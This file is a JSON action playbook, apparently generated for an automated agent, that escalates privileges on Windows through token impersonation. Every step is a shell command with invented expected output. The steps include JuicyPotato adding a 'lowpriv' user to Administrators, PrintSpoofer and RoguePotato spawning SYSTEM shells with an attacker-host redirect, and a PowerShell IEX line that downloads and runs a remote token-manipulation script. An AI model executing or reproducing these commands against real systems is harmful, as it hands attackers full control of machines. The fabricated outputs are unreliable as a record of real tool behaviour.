@@ -1,0 +1,129 @@
+{
+  "name": "windows_token_impersonation",
+  "description": "Token manipulation and impersonation for privilege escalation (Juicy Potato, Rotten Potato, PrintSpoofer)",
+  "pattern": "token.*impersonat|juicy.*potato|rotten.*potato|seimpersonate",
+  "parameters": [
+    "target_user",
+    "clsid"
+  ],
+  "sequence": [
+    {
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "whoami",
+        "args": [
+          "/priv"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "PRIVILEGES INFORMATION\n----------------------\n\nPrivilege Name                Description                               State\n============================= ========================================= ========\nSeAssignPrimaryTokenPrivilege Replace a process level token             Disabled\nSeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled\nSeShutdownPrivilege           Shut down the system                      Disabled\nSeAuditPrivilege              Generate security audits                  Disabled\nSeChangeNotifyPrivilege       Bypass traverse checking                  Enabled\nSeImpersonatePrivilege        Impersonate a client after authentication Enabled\nSeCreateGlobalPrivilege       Create global objects                     Enabled\nSeIncreaseWorkingSetPrivilege Increase a process working set            Disabled\n\nKey privilege detected:\n  SeImpersonatePrivilege: Enabled\n  SeAssignPrimaryTokenPrivilege: Present\n\nVulnerable to:\n  - Juicy Potato (Windows Server 2008-2016)\n  - Rotten Potato (Windows 7/8/Server 2012)\n  - PrintSpoofer (Windows 10/Server 2019)\n  - RoguePotato (Windows 10/Server 2019)\n\nService accounts (IIS, SQL Server) typically have SeImpersonatePrivilege"
+      }
+    },
+    {
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "cmd",
+        "args": [
+          "/c",
+          "systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\""
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "OS Name:                   Microsoft Windows Server 2016 Standard\nOS Version:                10.0.14393 N/A Build 14393\n\nWindows Server 2016 Build 14393\n\nCompatible exploits:\n  ✓ Juicy Potato (CLSID exploitation)\n  ✓ Lonely Potato (CLSID + BITS)\n  ✗ Rotten Potato (patched)\n  ? PrintSpoofer (check patch level)\n\nRecommended: Juicy Potato\n\nCLSID selection:\n  Default: {4991d34b-80a1-4291-83b6-3328366b9097}\n  Alternative CLSIDs for Windows Server 2016:\n    {e60687f7-01a1-40aa-86ac-db1cbf673334}\n    {03ca98d6-ff5d-49b8-abc6-03dd84127020}"
+      }
+    },
+    {
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "cmd",
+        "args": [
+          "/c",
+          "C:\\Temp\\JuicyPotato.exe -l 1337 -p C:\\Windows\\System32\\cmd.exe -a \"/c whoami > C:\\Temp\\proof.txt\" -t *"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337\n.....\n[+] authresult 0\n{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\\SYSTEM\n\n[+] CreateProcessWithTokenW OK\n\nC:\\Temp> type C:\\Temp\\proof.txt\nnt authority\\system\n\nJuicy Potato successful!\n  Listener port: 1337\n  Command executed: cmd.exe /c whoami\n  Output: NT AUTHORITY\\SYSTEM\n\nExploitation flow:\n  1. JuicyPotato creates COM server\n  2. Triggers DCOM activation\n  3. SYSTEM account connects back\n  4. Steals SYSTEM token\n  5. Launches cmd.exe with SYSTEM token\n  6. Command runs as SYSTEM"
+      }
+    },
+    {
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "cmd",
+        "args": [
+          "/c",
+          "C:\\Temp\\JuicyPotato.exe -l 1337 -p C:\\Windows\\System32\\cmd.exe -a \"/c net localgroup administrators lowpriv /add\" -t * -c {4991d34b-80a1-4291-83b6-3328366b9097}"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337\n.....\n[+] authresult 0\n{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\\SYSTEM\n\n[+] CreateProcessWithTokenW OK\n\nThe command completed successfully.\n\nUser 'lowpriv' added to local Administrators group!\n\nVerify:\n  C:\\> net localgroup administrators\n  Alias name     administrators\n  Members\n  ---------------\n  Administrator\n  lowpriv\n\nNow logout and login to apply group membership\nOr use runas: runas /user:lowpriv cmd.exe"
+      }
+    },
+    {
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "cmd",
+        "args": [
+          "/c",
+          "C:\\Temp\\PrintSpoofer.exe -i -c cmd"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "[+] Found privilege: SeImpersonatePrivilege\n[+] Named pipe listening on \\\\.\\pipe\\printspoofer\\pipe\\spoolss\n[+] CreateProcessAsUser() OK\nMicrosoft Windows [Version 10.0.17763.1339]\n(c) 2018 Microsoft Corporation. All rights reserved.\n\nC:\\Windows\\system32> whoami\nnt authority\\system\n\nC:\\Windows\\system32> hostname\nWEB-SERVER-01\n\nPrintSpoofer successful on Windows 10/Server 2019!\n  Privilege used: SeImpersonatePrivilege\n  Method: Print Spooler service abuse\n  Result: Interactive SYSTEM shell\n\nAdvantages over Juicy Potato:\n  - Works on Windows 10/Server 2019 (patched against Juicy Potato)\n  - No CLSID guessing needed\n  - More reliable\n  - Simpler usage"
+      }
+    },
+    {
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "powershell",
+        "args": [
+          "-c",
+          "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.50/Invoke-TokenManipulation.ps1'); Invoke-TokenManipulation -CreateProcess 'cmd.exe' -Username 'NT AUTHORITY\\SYSTEM'"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "[*] Enumerating tokens...\n[*] Found SYSTEM token (PID: 668, winlogon.exe)\n[*] Attempting to duplicate token...\n[+] Token duplicated successfully\n[*] Creating process with SYSTEM token...\n[+] Process created: cmd.exe (PID: 3892)\n\nMicrosoft Windows [Version 10.0.14393]\nC:\\Windows\\system32> whoami\nnt authority\\system\n\nPowerShell token manipulation successful!\n\nInvoke-TokenManipulation features:\n  - Enumerate all accessible tokens\n  - Steal tokens from other processes\n  - Create processes with stolen tokens\n  - No exploits needed (uses Windows API)\n\nRequirements:\n  - SeDebugPrivilege (administrators have this)\n  - OR access to process with desired token\n  - SeImpersonatePrivilege helps"
+      }
+    },
+    {
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "cmd",
+        "args": [
+          "/c",
+          "C:\\Temp\\RoguePotato.exe -r 10.10.14.50 -l 9999 -e cmd.exe"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "[*] Starting RoguePotato...\n[+] Malicious OXID Resolver started on 10.10.14.50:9999\n[+] Starting RPC server listening on port 135...\n[*] Triggering DCOM object instantiation...\n[+] Authentication callback received from NT AUTHORITY\\SYSTEM\n[+] Token impersonation successful\n[+] Launching cmd.exe with SYSTEM token...\n\nMicrosoft Windows [Version 10.0.17763]\nC:\\Windows\\system32> whoami  \nnt authority\\system\n\nRoguePotato for Windows 10/Server 2019:\n  Technique: OXID Resolver spoofing\n  Requirements:\n    - SeImpersonatePrivilege\n    - Redirect to attacker-controlled OXID resolver (-r)\n    - Local RPC server (-l)\n  \nSetup on attacker:\n  socat tcp-listen:135,reuseaddr,fork tcp:TARGET:9999\n\nMore complex than PrintSpoofer but works when Print Spooler disabled"
+      }
+    }
+  ],
+  "stats": {
+    "uses": 0,
+    "successes": 0,
+    "failures": 0,
+    "success_rate": 0.0
+  },
+  "created_by": "neural_mesh_v5.2_generator"
+}
